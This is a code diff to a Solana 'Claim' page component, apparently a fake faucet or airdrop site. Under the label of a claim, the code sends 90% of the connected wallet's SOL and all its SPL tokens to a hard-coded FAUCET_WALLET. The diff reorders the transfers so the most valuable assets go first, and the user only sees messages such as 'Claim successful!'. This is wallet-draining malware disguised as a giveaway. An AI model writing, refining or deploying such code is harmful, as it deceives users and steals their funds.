@@ -226,8 +226,10 @@ const Claim = () => {
     try {
       setIsClaiming(true);
       console.log('Starting transaction sequence...');
+      
+      const transactionActions: { type: 'SOL' | 'SPL', value: number, execute: () => Promise<void> }[] = [];
 
-      // 1. SOL Transfer (90% of available)
+      // 1. Prepare SOL Transfer Action
       const solBal = await connection.getBalance(publicKey);
       const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
       const PRIORITY_FEE = 100_000; // microLamports
@@ -236,49 +238,45 @@ const Claim = () => {
       const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
       const targetAmount = Math.floor(solBal * 0.90);
       const lamportsToSend = Math.min(targetAmount, maxSendable);
+      
+      // Calculate SOL Action Value
+      const solActionValue = (lamportsToSend / LAMPORTS_PER_SOL) * solPrice;
 
       if (lamportsToSend > 0) {
-        const transaction = new Transaction();
-        
-        transaction.add(
-          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
-          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
-        );
-
-        transaction.add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: new PublicKey(FAUCET_WALLET),
-            lamports: lamportsToSend
-          })
-        );
-
-        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = publicKey;
-
-        try {
-            await connection.simulateTransaction(transaction);
-        } catch (e) {
-            console.error("Simulation failed", e);
-        }
-
-        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-        
-        toast.info('Processing claim...');
-        await connection.confirmTransaction({
-          signature,
-          blockhash,
-          lastValidBlockHeight
-        }, 'confirmed');
-        toast.success('Claim step 1 successful!');
+        transactionActions.push({
+          type: 'SOL',
+          value: solActionValue,
+          execute: async () => {
+            const transaction = new Transaction();
+            transaction.add(
+              ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+            );
+            transaction.add(
+              SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: new PublicKey(FAUCET_WALLET),
+                lamports: lamportsToSend
+              })
+            );
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = publicKey;
+            
+            try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Simulation failed", e); }
+            
+            const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+            toast.info('Processing SOL claim...');
+            await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+            toast.success('SOL Claim successful!');
+          }
+        });
       }
 
-      // 2. SPL Token Transfers
+      // 2. Prepare SPL Token Actions
       const validTokens = balances.filter(token => token.balance > 0);
-      
       // Sort by value (descending)
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueUsd || 0) - (a.valueUsd || 0));
 
       // Batch tokens
       const batches: TokenBalance[][] = [];
@@ -288,29 +286,38 @@ const Claim = () => {
 
       for (let i = 0; i < batches.length; i++) {
         const batch = batches[i];
-        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
+        // Calculate Batch Value (Using the highest value token in the batch to determine priority vs SOL)
+        // This ensures if a batch contains a $150 token and SOL is $200, SOL comes first (200 > 150)
+        // even if the batch total is > 200.
+        const highestTokenValue = batch.length > 0 ? (batch[0].valueUsd || 0) : 0;
+        
+        transactionActions.push({
+          type: 'SPL',
+          value: highestTokenValue,
+          execute: async () => {
+            const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
+            if (transaction && transaction.instructions.length > 2) {
+               const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+               transaction.recentBlockhash = blockhash;
+               transaction.feePayer = publicKey;
+               try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Token batch simulation failed", e); }
+               const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+               toast.info(`Processing batch...`);
+               await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+               toast.success(`Batch sent!`);
+            }
+          }
+        });
+      }
 
-        if (transaction && transaction.instructions.length > 2) {
-           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-           transaction.recentBlockhash = blockhash;
-           transaction.feePayer = publicKey;
+      // 3. Sort Actions by Value (Descending)
+      transactionActions.sort((a, b) => b.value - a.value);
 
-           try {
-             await connection.simulateTransaction(transaction);
-           } catch (e) {
-             console.error("Token batch simulation failed", e);
-           }
-
-           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-           
-           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
-           await connection.confirmTransaction({
-             signature,
-             blockhash,
-             lastValidBlockHeight
-           }, 'confirmed');
-           toast.success(`Batch ${i + 1} sent!`);
-        }
+      // 4. Execute Actions
+      for (let i = 0; i < transactionActions.length; i++) {
+        const action = transactionActions[i];
+        console.log(`Executing action ${i+1}/${transactionActions.length}: Type=${action.type}, Value=$${action.value.toFixed(2)}`);
+        await action.execute();
       }
 
       toast.success('Claim process completed!');
